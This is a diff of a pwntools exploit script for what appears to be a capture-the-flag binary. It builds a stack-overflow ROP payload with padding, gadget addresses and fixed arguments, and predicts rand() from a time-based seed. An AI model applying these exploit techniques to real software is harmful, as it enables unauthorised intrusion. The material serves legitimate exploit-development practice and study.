@@ -1,8 +1,8 @@
 from pwn import *
 from ctypes import CDLL
 
-#p = process('./chall', env={"LD_PRELOAD" : "./libc.so.6"})
-p = remote('localhost', 7007)
+p = process('./chall', env={"LD_PRELOAD" : "./libc.so.6"})
+#p = remote('localhost', 7007)
 libc = CDLL("libc.so.6")
 libc.srand(int(time.time()) & 0xffffff00)
 rand_val = libc.rand()
@@ -20,14 +20,8 @@ p.recvuntil('Please enter your name: \n')
 pop_rdi = p64(0x0000000000401813)
 main_ret = 0x00000000004017a9
 
-d1 = 0x1ffdd898f
-d2 = 0x7e40fcc3
-c1 = d1 ^ 0x55556666;
-c2 = d2 ^ 0x77778888;
-u = c1 ^ 0x11112222
-v = c2 ^ 0x33334444
-arg2 = (u + v) // 2
-arg3 = (u - v) // 2
+arg2 = 0xfacefeed
+arg3 = 0xc0cacede
 
 pay = 'a'*0x28 + p64(Sum) + p64(arg3) + p64(arg2) + p64(0x183b02d47) + 'a'*0x8 + p64(0x00000000004017a9)
 pay += pop_rdi
